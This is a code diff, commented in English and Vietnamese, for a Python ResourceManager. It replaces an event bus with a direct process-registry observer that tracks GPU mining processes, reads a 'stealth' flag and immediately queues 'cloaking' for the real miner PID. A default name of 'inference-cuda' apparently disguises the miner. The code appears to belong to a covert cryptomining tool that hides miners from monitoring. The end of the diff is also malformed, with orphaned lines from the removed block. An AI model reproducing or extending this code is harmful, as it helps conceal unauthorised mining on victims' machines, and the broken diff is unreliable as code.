@@ -236,7 +236,7 @@ class ResourceManager(IResourceManager):
                 cls._instance = super(ResourceManager, cls).__new__(cls)
         return cls._instance
 
-    def __init__(self, config: ConfigModel, event_bus: EventBus, logger: logging.Logger):
+    def __init__(self, config: ConfigModel, event_bus=None, logger: logging.Logger = None):
         if getattr(self, '_initialized', False):
             return
 
@@ -246,7 +246,8 @@ class ResourceManager(IResourceManager):
         
         # ✅ ENHANCED: Configuration validation before initialization
         self.config = self._validate_configuration(config)
-        self.event_bus = event_bus
+        # 🗑️ **DEPRECATED**: EventBus deprecated in favor of DirectPIDRegistry
+        self.event_bus = None  # EventBus completely removed
 
         # Cờ dừng
         self._stop_flag = False
@@ -257,8 +258,8 @@ class ResourceManager(IResourceManager):
 
         # ✅ REMOVED: GPU-only queue - simplified logic in enqueue_cloaking()
 
-        # **EventBus subscribe** (đăng ký EventBus) - **PID Propagation Flow Step 2**
-        self._setup_eventbus_subscriptions()
+        # 🚀 **DIRECT REGISTRY OBSERVER** (quan sát registry trực tiếp) - **THAY THẾ EVENTBUS**
+        self._setup_direct_registry_observer()
         
         # Hàng đợi cloaking chung (legacy compatibility)
         self.resource_adjustment_queue = queue.PriorityQueue()
@@ -390,71 +391,181 @@ class ResourceManager(IResourceManager):
         except Exception as e:
             self.logger.error(f"❌ Error in resource adjustment processing: {e}")
 
-    def _setup_eventbus_subscriptions(self):
-        """✅ SIMPLIFIED: Essential EventBus subscriptions with memory backend fallback"""
+    def _setup_direct_registry_observer(self):
+        """
+        🚀 **Direct Registry Observer Setup** (thiết lập quan sát registry trực tiếp)
+        
+        CORE REPLACEMENT cho EventBus subscriptions.
+        Đăng ký ResourceManager làm observer để nhận immediate notifications
+        khi có process mới được registered trong DirectPIDRegistry.
+        """
         try:
-            self.logger.info("🔌 Setting up essential EventBus subscriptions...")
+            self.logger.info("🔌 Setting up Direct Registry Observer (replacing EventBus)...")
             
-            # ✅ GPU-ONLY: Subscribe to GPU mining events only
-            self.logger.info("🔍 [DIAGNOSTIC] Subscribing to mining:gpu_pid_registered event")
-            self.event_bus.subscribe('mining:gpu_pid_registered', self._on_gpu_mining_event)
-            
-            self.event_bus.start_listening()
-            self.logger.info("✅ EventBus subscriptions established successfully")
-            
-            # 👉 NEW DEBUG: hiển thị danh sách subscribers hiện tại để xác minh
+            # **Import DirectPIDRegistry** (nhập DirectPIDRegistry)
             try:
-                subs = getattr(self.event_bus._backend, '_subscribers', {})
-                self.logger.debug(f"[TRACE] Subscribers after setup: {subs}")
-            except Exception as sub_err:
-                self.logger.debug(f"[TRACE] Unable to read subscribers: {sub_err}")
+                from pid_logger.direct_registry import get_direct_registry
+                self.direct_registry = get_direct_registry()
+            except ImportError as import_err:
+                self.logger.error(f"❌ Failed to import DirectPIDRegistry: {import_err}")
+                self.logger.warning("⚠️ Running without Direct Registry - falling back to periodic discovery only")
+                self.direct_registry = None
+                return
+            
+            # **Register ResourceManager as observer** (đăng ký ResourceManager làm observer)
+            if self.direct_registry:
+                success = self.direct_registry.register_observer(self._on_process_registered_direct)
+                
+                if success:
+                    self.logger.info("✅ Direct Registry Observer established successfully")
+                    self.logger.info("📊 ResourceManager will receive immediate process notifications")
+                    
+                    # **Debug: Display current registry statistics** (hiển thị thống kê registry hiện tại)
+                    try:
+                        stats = self.direct_registry.get_statistics()
+                        self.logger.debug(f"[REGISTRY-STATS] {stats}")
+                    except Exception as stats_err:
+                        self.logger.debug(f"[REGISTRY-STATS] Unable to read stats: {stats_err}")
+                        
+                else:
+                    self.logger.error("❌ Failed to register Direct Registry Observer")
+                    self.direct_registry = None
             
         except Exception as e:
-            self.logger.error(f"❌ EventBus setup failed: {e}")
-            self.logger.warning("⚠️ Running without EventBus - using fallback mode")
-            self.event_bus = None
+            self.logger.error(f"❌ Direct Registry Observer setup failed: {e}")
+            self.logger.warning("⚠️ Running without Direct Registry - using periodic discovery only")
+            self.direct_registry = None
 
     # CPU event handling completely removed - GPU-only mode
 
-    def _on_gpu_mining_event(self, payload: Dict[str, Any]) -> None:
-        """Handle GPU mining events - PID Propagation Flow Step 2 - **WRAPPER PID DETECTION** (phát hiện PID wrapper)"""
+    def _on_process_registered_direct(self, process_info) -> None:
+        """
+        🚀 **Direct Process Registration Handler** (xử lý đăng ký tiến trình trực tiếp)
+        
+        CORE REPLACEMENT cho _on_gpu_mining_event().
+        Nhận ProcessInfo object trực tiếp từ DirectPIDRegistry thay vì event payload.
+        
+        Args:
+            process_info: ProcessInfo object chứa thông tin mining process
+        """
         try:
-            # ✅ WRAPPER DETECTION: PID from EventBus is wrapper PID, not real mining PID
-            wrapper_pid = payload.get('pid')
-            role = payload.get('role', 'wrapper')  # Default to wrapper since EventBus sends wrapper PID
-            process_name = payload.get('process_name', 'inference-cuda')
-            status = payload.get('status')
+            # **Extract process information** (trích xuất thông tin tiến trình)
+            pid = process_info.pid
+            process_type = process_info.process_type
+            process_name = process_info.process_name
+            metadata = process_info.metadata or {}
             
-            # ✅ VALIDATION: Ensure we have wrapper PID
-            if not wrapper_pid:
-                self.logger.warning("⚠️ No PID in mining event payload - skipping")
-                return
+            # **Get registration source** (lấy nguồn đăng ký)
+            registration_source = metadata.get('registration_source', 'unknown')
+            role = metadata.get('role', 'real')  # Direct registry sends real PID
+            stealth_enabled = metadata.get('stealth_enabled', False)
+            
+            self.logger.info(f"🚀 [DIRECT-REGISTRY] ResourceManager received process registration:")
+            self.logger.info(f"   ├─ PID: {pid}")
+            self.logger.info(f"   ├─ Type: {process_type}")
+            self.logger.info(f"   ├─ Name: {process_name}")
+            self.logger.info(f"   ├─ Role: {role}")
+            self.logger.info(f"   ├─ Source: {registration_source}")
+            self.logger.info(f"   └─ Stealth: {stealth_enabled}")
+            
+            # **Process GPU mining process registration** (xử lý đăng ký tiến trình khai thác GPU)
+            if process_type == "gpu":
+                self.logger.info(f"🎮 Processing GPU mining process: PID={pid}, Name={process_name}")
                 
-            if wrapper_pid and status == 'running':
-                self.logger.info(f"🎮 ResourceManager received GPU PID registered: PID={wrapper_pid} (WRAPPER)")
-                self.logger.debug(f"[DEBUG] GPU event payload: {payload}")
-                
-                # ✅ NEW LOGIC: Add wrapper PID to ignored list instead of cloaking
-                self.ignored_wrapper_pids.add(wrapper_pid)
-                self.logger.info(f"🚫 Added wrapper PID {wrapper_pid} to ignored list - will not be cloaked")
-                self.logger.info(f"📋 Current ignored wrapper PIDs: {list(self.ignored_wrapper_pids)}")
-                
-                # ✅ INFO: Explain that real mining PID will be discovered via process discovery
-                self.logger.info(f"ℹ️ Real mining PID will be discovered automatically via periodic process discovery")
-                self.logger.info(f"✅ Wrapper PID {wrapper_pid} processed: added to ignore list")
+                # **ENHANCED: Real PID handling** (xử lý PID thật nâng cao)
+                if role == 'real':
+                    self.logger.info(f"✅ [REAL-PID] Direct registry provided REAL mining PID: {pid}")
+                    
+                    # **Immediate cloaking activation** (kích hoạt cloaking tức thì)
+                    self.logger.info(f"🔒 [IMMEDIATE-CLOAKING] Activating cloaking for real mining PID {pid}")
+                    
+                    # **Add to mining processes for tracking** (thêm vào danh sách mining processes để theo dõi)
+                    try:
+                        mining_process = MiningProcess(
+                            pid=pid,
+                            process_type=process_type,
+                            process_name=process_name,
+                            start_time=process_info.start_time,
+                            process_obj=process_info.process_obj
+                        )
+                        
+                        with self.mining_processes_lock:
+                            # **Check for duplicates** (kiểm tra trùng lặp)
+                            existing = [p for p in self.mining_processes if p.pid == pid]
+                            if not existing:
+                                self.mining_processes.append(mining_process)
+                                self.logger.info(f"📋 Added mining process to tracking list: PID={pid}")
+                            else:
+                                self.logger.info(f"📋 Mining process already tracked: PID={pid}")
+                        
+                        # **Trigger immediate plugin activation** (kích hoạt plugin tức thì)
+                        self._trigger_immediate_cloaking(mining_process)
+                        
+                    except Exception as tracking_err:
+                        self.logger.error(f"❌ Failed to add mining process to tracking: {tracking_err}")
+                else:
+                    # **Wrapper PID handling** (xử lý PID wrapper)
+                    self.logger.info(f"📦 [WRAPPER-PID] Adding wrapper PID to ignored list: {pid}")
+                    if not hasattr(self, 'ignored_wrapper_pids'):
+                        self.ignored_wrapper_pids = set()
+                    self.ignored_wrapper_pids.add(pid)
+                    
+            else:
+                self.logger.warning(f"⚠️ Unsupported process type: {process_type}")
                 
         except Exception as e:
-            error_msg = f"❌ Error handling GPU mining event: {e}"
+            error_msg = f"❌ Error in direct process registration handler: {e}"
             self.logger.error(error_msg)
+            # **Error reporting** (báo cáo lỗi)
+            report_error(
+                ErrorCode.RESOURCE_MANAGER_ERROR,
+                error_msg,
+                ErrorSeverity.HIGH
+            )
+    
+    def _trigger_immediate_cloaking(self, mining_process) -> None:
+        """
+        🚀 **Immediate Cloaking Activation** (kích hoạt cloaking tức thì)
+        
+        Kích hoạt GPU cloaking plugins ngay lập tức khi nhận được
+        real mining PID từ DirectPIDRegistry.
+        
+        Args:
+            mining_process: MiningProcess object cần apply cloaking
+        """
+        try:
+            self.logger.info(f"🔒 [IMMEDIATE-CLOAKING] Starting immediate cloaking for PID {mining_process.pid}")
             
-            # ✅ ENHANCED: Error propagation through EventBus
-            try:
-                if self.event_bus:
-                    self.event_bus.publish('resource_manager:gpu_event_error', {
-                        'error_type': 'gpu_event_handling_failed', 
-                        'error_message': str(e),
-                        'payload': payload,
-                        'timestamp': time.time(),
+            # **Create high-priority cloaking task** (tạo nhiệm vụ cloaking ưu tiên cao)
+            cloaking_task = (
+                0,  # Highest priority
+                time.time(),  # Timestamp
+                {
+                    'action': 'immediate_cloak',
+                    'process': mining_process,
+                    'source': 'direct_registry',
+                    'urgent': True
+                }
+            )
+            
+            # **Enqueue for immediate processing** (xếp hàng để xử lý tức thì)
+            self.resource_adjustment_queue.put(cloaking_task)
+            self.logger.info(f"⚡ [IMMEDIATE-CLOAKING] High-priority cloaking task queued for PID {mining_process.pid}")
+            
+            # **Optional: Force process discovery refresh** (tùy chọn: buộc làm mới khám phá tiến trình)
+            if hasattr(self, 'shared_resource_manager'):
+                try:
+                    # **Manual process discovery trigger** (kích hoạt khám phá tiến trình thủ công)
+                    self.logger.debug(f"🔍 [IMMEDIATE-CLOAKING] Triggering process discovery refresh")
+                    # Note: Actual discovery implementation would be called here
+                except Exception as discovery_err:
+                    self.logger.warning(f"⚠️ [IMMEDIATE-CLOAKING] Process discovery refresh failed: {discovery_err}")
+            
+            self.logger.info(f"✅ [IMMEDIATE-CLOAKING] Immediate cloaking activation completed for PID {mining_process.pid}")
+            
+        except Exception as e:
+            self.logger.error(f"❌ [IMMEDIATE-CLOAKING] Failed to trigger immediate cloaking: {e}")
+            # **Continue processing** (tiếp tục xử lý) - don't fail the entire registration
                         'severity': 'high'
                     })
             except Exception as pub_error:
